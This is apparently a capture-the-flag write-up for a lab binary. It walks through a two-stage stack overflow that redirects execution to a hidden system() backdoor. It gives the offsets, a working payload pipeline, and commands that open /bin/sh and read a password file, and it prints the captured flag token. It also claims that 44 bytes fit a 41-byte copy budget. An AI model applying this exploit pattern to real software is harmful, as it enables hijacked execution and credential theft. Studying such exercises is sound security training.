# level09

1. Overview

* Two-step **stack overflow** leading to a clean ret2win into a hidden backdoor.
* `set_username()` can overwrite fields **past** a 140-byte buffer, including the message length used by `set_msg()`.
* `set_msg()` then copies attacker-controlled bytes into the same buffer using that (now attacker-chosen) length, letting us overwrite the **return address**.
* Target function to jump to: `secret_backdoor()`, which runs `system()` on a line read from stdin.

```c
void secret_backdoor(void) {
    char buf[128];
    fgets(buf, 0x80, stdin);
    system(buf);
}
```

2. What the code does (short)

* `handle_msg()` allocates a 140-byte buffer on the stack plus several locals. It sets `msg_len = 0x8c` (140).
* `set_username(buf)` reads up to 0x80 bytes, then copies **up to 0x29 (41) bytes** into **`buf + 0x8c`**. That writes **beyond** the 140-byte buffer into the adjacent locals.
* `set_msg(buf)` reads a message and does `strncpy(buf, msg, *(int *)(buf + 0xb4))`. The length at `buf + 0xb4` is exactly the `msg_len` field we can modify via `set_username()`.
* Overflow with `set_msg()` to smash the return address and point it at `secret_backdoor`.

3. Key offsets (typical x86-64 build)

* `buf`           at offset 0
* `msg_len`       at **offset 180** (`buf + 0xb4`) ← we want to set this high (e.g., 500)
* saved return    around **offset ~200** (varies slightly by build; 200 works in the reference)
* Distance from `buf + 0x8c` (where `set_username` writes) to `msg_len` is **40 bytes** → within the 41-byte copy budget

4. Find `secret_backdoor` address

```gdb
(gdb) b main
(gdb) run
(gdb) p secret_backdoor
$1 = (void (*)(void)) 0x55555555488c   # example
```

Use your own address if it differs.

5. Exploit plan

* **Stage 1 (username):** set `msg_len` to a large value (e.g., `500`). We do this by writing 40 padding bytes, then the little-endian integer `0x000001f4` at `buf+0xb4`.
* **Stage 2 (message):** send `B * <offset_to_RET>` followed by the **little-endian** 8-byte address of `secret_backdoor`.
* Keep stdin open so `secret_backdoor()` can read and execute your command.

6. Commands (single pipeline)

```bash
# Example with secret_backdoor = 0x000055555555488c
(
  python -c "print('A'*40 + '\xf4\x01\x00\x00')";              # Stage 1: msg_len = 500
  python -c "print('\x90'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')";  # Stage 2: smash RET
  cat                                                     # keep stdin open for backdoor
) | ./level09
```

Then type a command for the backdoor, e.g.:

```bash
/bin/sh
# or directly:
cat /home/users/end/.pass
```

7. Why this works

* `set_username` lets you write **41 bytes** starting at `buf + 0x8c`. Writing 40 bytes of padding plus a 4‑byte integer lands exactly on `msg_len` at `buf + 0xb4`.
* `set_msg` trusts `msg_len` and overflows the 140‑byte buffer with up to `msg_len` bytes, smashing the saved return.
* On function return, control transfers to `secret_backdoor`, which immediately calls `system()` on input you provide.

8. Token

Token found `j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`
